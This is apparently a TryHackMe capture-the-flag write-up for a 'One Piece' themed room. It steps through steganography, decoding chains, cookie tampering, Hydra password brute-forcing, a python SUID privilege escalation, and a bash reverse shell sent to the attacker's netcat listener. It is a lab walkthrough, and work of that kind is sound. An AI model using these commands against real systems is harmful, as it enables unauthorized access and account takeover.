One Piece is one of my favorite anime. In this room, we're going to help `Monkey D. Luffy` become the **King of the Pirates** and find the world's most valuable treasure — the`One Piece.`

_<https://tryhackme.com/room/ctfonepiece65>_

## Task 1: Set Sail
``Welcome to the One Piece room.``

Your dream is to find the One Piece and hence to become the **Pirate King**.
Once the VM is deployed, you will be able to enter a World full of Pirates.
Please notice that pirates do not play fair. They can create rabbit holes to trap you.
This room may be a bit different to what you are used to:
* Required skills to perform the intended exploits are pretty basic.
* However, solving the (let's say) "enigmas" to know what you need to do may be trickier.
This room is some sort of game, some sort of puzzle.

> **Please Note:** that if you are currently reading/watching One Piece and if you did not finish **Zou arc**, you will get spoiled during this room. (don't forget to start VPN also  )

## Task2: Road Poneglyphs

`In order to reach Laugh Tale, the island where the One Piece is located, you must collect the 4 Road Poneglyphs.`

### 🔍 Scanning
As you know, our first step is scanning. We used Nmap, and it gave us some amazing results. Now, let's focus on what Nmap has revealed to us!

```console
nmap -sCV 10.10.141.167

We can clearly see that anonymous login is allowed — that's interesting. Let's try logging in as `anonymous` and see what we can find!

We found a file named `welcome.txt` and a directory called `.the_whale_tree`. Let's navigate into the directory to see if there's anything interesting inside.

```console

To download files, we use the `get` or `mget` commands. The **only difference is that get is used to download a single file from the remote server, while mget allows you to download multiple files that match a pattern** (such as using wildcards).
Just like we download all files 

```console

```
When we checked welcome.txt, it seemed to contain something interesting. Let's take a look!
```console
cat welcome.txt     
Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World.
Except this, there is not much to say about this island.
```
The .secret_room.txt file points to a destination, but I'm not revealing the directory—or should I say, the final destination? :(
> **Q: What is the name of the tree that contains the 1st Road Poneglyph?**

```console
cat .secret_room.txt 
Inuarashi: You reached the center of [REDACTED], the majestic tree of Zou.
Nekomamushi: We have hidden this place for centuries.
Inuarashi: Indeed, it holds a secret.
Nekomamushi: Do you see this red stele ? This is a Road Poneglyph.
Luffy: A Road Poneglyph ??
Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
Luffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!!
Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.
Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.
Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily.
Luffy: I will show them, there can be only one Pirate King and it will be me !!
Inuarashi: There is another issue regarding the Road Poneglyph.
Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them. 
```
Alright, we also see that port 80 is open. Let's check out what's running there—copy and paste the IP address into your favorite browser and take a look!

![New_World](New_World.png){: width="800" height="150" .shadow }

> **Note:**  
> Straw Hat Luffy and his crew are sailing in the New World.  
> They have only one thing in mind—reaching the One Piece and becoming the Pirate King, the freest man in the world.  
>  
> Unfortunately, their navigator Nami lost the Log Pose, and as you know, it's impossible to steer properly without it.  
> You need to find the Log Pose to reach the next island.

The important thing here is to check the source code of the index.html page and look for a long string hidden within it.

```console
 You need to find the `Log Pose` to be able to reach the next island.
<!--J5VEKNCJKZEXEU[REDACTED]RJEKWTMGRUVCMCKONQTGTJ5
```
After decoding the long string using CyberChef—or dcode.fr, whichever you prefer—we get the following result:
```console
Nami ensures there are precisely 3472 possible places where she could have lost it.
```

## First Poneglph
So, we have our first Poneglyph! Since the file is a `.road_poneglyph.jpeg`, we’ll use steghide to extract any hidden data from it.
```console
$ steghide extract -sf .road_poneglyph.jpeg   
Enter passphrase: 
wrote extracted data to "road_poneglyphe1.txt".
```
```console
FUWS2LJNEAWS2LJNFUQC4L[REDACTED]
```
### Decode First Poneglph
```console
From base 32 and also remove the non-alphabet chars
From Morse Code
From binary
From hex
```
After decoding the source code from the index page, we discovered that there are 3,472 possible places where she could have lost it.
> 💡 **Hint:** Only Sea, It's Not Terrible.

The hint says 'only sea, not terrible'—clearly referring to the internet as the 'sea.' So, if we search for '3472 Log Pose' on GitHub, we might just find a useful link.

[Next Island](https://github.com/1FreyR/LogPose)

Through this link, we get access to a LogPose.txt file. Simply brute-force it to find the next island.

### 🛰️ Enumeration
We used Gobuster here to perform brute-forcing. There are several tools available for this task, such as Feroxbuster, FFUF, Wfuzz, and others.
```console
gobuster dir -u http://$IP -w LogPose.txt -x php,css,txt,html,zip,bak
```
![bird_cage](birdcage.png){: width="800" height="150" .shadow }

> **Q: What is the name of the 1st pirate you meet navigating the Apache Sea?**
![DON](DON.png){: width="800" height="150" .shadow }

![doffy](doffy.gif){: width="800" height="150" .shadow }

we have a rabbit hole also in 1st pirate you meet navigating the Apache Sea
![rabbit_hole](rabbit_hole.png){: width="800" height="150" .shadow }

![Loop_hole](loop_hole.webp){: width="800" height="150" .shadow }

To reach the next island, you'll need to check the CSS directory by visiting $IP/css
![sweet](sweet.png){: width="800" height="150" .shadow }

Check the dressrosa_style.css file—you'll find a king_kong_gun.jpg
![king_kong](king_kong_gun.png){: width="800" height="150" .shadow }

```console
$ file king_kong_gun.jpg 
king_kong_gun.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "Doflamingo is /ko.jpg", progressive, precision 8, 736x414, components 3
```
```console
strings ko.jpg
```
That will take you to the next island

> **Q: What is the name of the 2nd island you reach navigating the Apache Sea?**

![BIG_MOM](BIG_MOM.png){: width="800" height="150" .shadow }

![MoM](bigmom.gif){: width="800" height="150" .shadow }

You are on [REDACTED] Island. This is the territory of Big Mom, one of the 4 Emperors, this is to say one of the 4 pirates the closest to the One Piece but also the strongest.
Big Mom chases you and want to destroy you. It is unthinkable to fight her directly.
You need to find a way to appease her. 

After reaching this island, you'll see the message: `What do you do?` To proceed, intercept the request and change the cookie value from `nocakeforyou` to `cakeforyou`.
I'm using a simpler approach—just open the browser's go to inspect after that go to storage change the cookie

> After doing this, we obtained the second Poneglyph!

![kaidooo](kaidooo.png){: width="800" height="150" .shadow }

## Decode Second Poneglyph
```console
From base 32 and also remove the non-alphabet chars
From Morse Code
From binary
From hex
```
Let’s set sail to the next island!

> **Q: What is the name of the friend you meet navigating the Apache Sea?**
![buggy](buggy.png){: width="800" height="150" .shadow }

![buggy](buggy.gif){: width="800" height="150" .shadow }

On your way, you decide to stop by an island you can see from your boat in order to get supplies.
Surprisingly enough, you meet your friend [REDACTED] there.
He wants to challenge you to play one of his games. He knows he can't lose, he even promise a Log Pose for Onigashima if you can beat him.
He even let you decide which game you'd like to play:
`Brick Breaker`    `Brain Teaser` 

We have two games to choose from to defeat Buggy: **Brick Breaker** and **Brain Teaser**. We'll start and inspect both. There’s nothing useful in Brick Breaker, but in Brain Teaser(js file), we find the name of the next island!

```javascript
document.getElementById('back').textContent = "Log Pose: /[REDACTED].php"  
```
> **Q: What is the name of the 2nd Emperor you meet navigating the Apache Sea?**
![BIG Giant](king_of_beastsss.png){: width="800" height="150" .shadow }

![Beast](kaido1.gif){: width="800" height="150" .shadow }

You reach the island of Onigashima. This is one of the Kaido's territory, one of the four Emperors, [REDACTED] is renowned as the Strongest Creature in the world.
It is said that if it is a 1 vs 1, Kaido will prevail.
Speaking about brute force, Kaido is unbeatable.

Straw Hat Luffy has 2 options: 
* Username and Password
* upload a php.shell

**Note:**  
> We successfully uploaded the shell, but we haven't found the correct path to access it.
> First, we need to find the username. I have an image of Kaido save it and check whether it contains any hidden data using steganography.

We found nothing using `steghide`, so we tried `stegseek` to crack the .jpg file and boom, we found the username!
```console
$ stegseek kaido.jpeg     
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "imabeast"       
[i] Original filename: "kaido_login.txt".
[i] Extracting to "kaido.jpeg.out".
```
So, we have the username. To find the password, we use Hydra with the rockyou.txt wordlist. After some time, the password will be cracked
```console
hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt 10.10.31.108 http-post-form "/[REDACTED].php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR" -t 64 -v
```
We’ve obtained the username and password and along with that, we’ve also found the **Third Poneglyph** and **last Poneglyph** Destination! The last Poneglyph destination First letter is U......... bottom right :)

![Third_pol](third_pol.png){: width="800" height="150" .shadow }

Now that we have all 4 Poneglyphs, we need to decode them in the correct order 1, 2, 3, and 4 to reveal the SSH credentials. If you decode them out of order, like 2, 1, 3, 4, it won’t work.

## Decode all Poneglyphs
```console
From base32
From Morse Code
From Binary
From Hex
From Base 58
From Base64
```
> **Q: What is the hidden message of the 4 Road Poneglyphs?**
![king](kingg.png){: width="800" height="150" .shadow }

## Task3: Laugh Tale

After obtaining the credentials, we log in via SSH and there it is, `laugh_tale.txt`!

> **Q: Who is on Laugh Tale at the same time as Luffy?**
```console
M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt 
Finally, we reached Laugh Tale.
All is left to do is to find the One Piece.
Wait, there is another boat in here.
Be careful, it is the boat of [REDACTED], one of the 4 Emperors. He is the one that led your brother Ace to his death.
You want your revenge. Let's take him down !
```

![Ace](Ace_Die.webp){: width="800" height="150" .shadow }

For further enumeration, we navigated to the /home directory and found two user folders: `luffy` and `teach`. We started in Luffy's directory, then moved to Teach's to look for anything interesting. After spending some time searching with no luck, we decided to check for SUID binaries—and boom, we found one!

```console
find / -type f -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gomugomunooo_king_kobraaa
```
`/usr/bin/gomugomunooo_king_kobraaa` gives us a Python shell. To exploit this SUID binary, we simply searched online for how to escalate privileges using Python **SUID** binaries and we found the method!

Link For SUID [here](https://gtfobins.github.io/gtfobins/python/)

```console
/home/teach$ /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
After successfully abusing the SUID binary, we created a file named `7uffy_vs_T3@ch`. When we run the ls command, we can see a file named luffy_vs_teach.txt

> **Q: What allowed Luffy to win the fight?**
```console
$ cat luffy_vs_teach.txt
This fight will determine who can take the One Piece and who will be the next Pirate King.
These 2 monsters have a matchless will and none of them can let the other prevail.
Each of them have the same dream, be the Pirate King.
For one it means: Take over the World.
For the other: Be the freest man in the World.
Each of their hit creates an earthquake felt on the entire island.
But in the end, Luffy thanks to his [REDACTED] won the fight.
Now, he needs to find the One Piece.
```

We simply ran ls -la and found a hidden file named .password.txt containing SSH credentials
```console
$ ls -la
total 56
drwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26  2020 .

```

Okay, so we logged in as `7uffy_vs_T3@ch`. To escalate to `root`, we generally try several methods—for example, running **linpeas.sh** for a comprehensive scan, and using **sudo -l** to see which commands can be run with elevated privileges."
> We used sudo -l to check which commands can be run with elevated privileges.

```console
$ sudo -l
[sudo] password for 7uffy_vs_T3@ch: 
Sorry, try again.
[sudo] password for 7uffy_vs_T3@ch:

User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less
```
User 7uffy_vs_T3@ch is allowed to run the following command as root on Laugh-Tale: /usr/local/bin/less.

> 📝**Note:**
> The less command is used to view the contents of text files in the terminal. It allows you to scroll forward and backward through the file easily without opening it in a full editor

Start listener:
```console
nc -lnvp 4444           
listening on [any] 4444 ...
connect to [10.8.128.221] from (UNKNOWN) [10.10.43.235] 49286
```
To become `root`, we simply overwrite or append our bash script to `/usr/local/bin/less`
```console
$ echo 'bash -i >& /dev/tcp/10.8.128.221/4444 0>&1' >> /usr/local/bin/less
$ sudo /usr/local/bin/less
```
Now that we’ve become root, our final task is to find the One Piece! To do it quickly, instead of searching manually, we’ll try using short and efficient commands.
```console
grep -iRl "One Piece" /home /usr 2>/dev/null
```

```console
/root# grep -iRl "One Piece" /home /usr 2>/dev/null
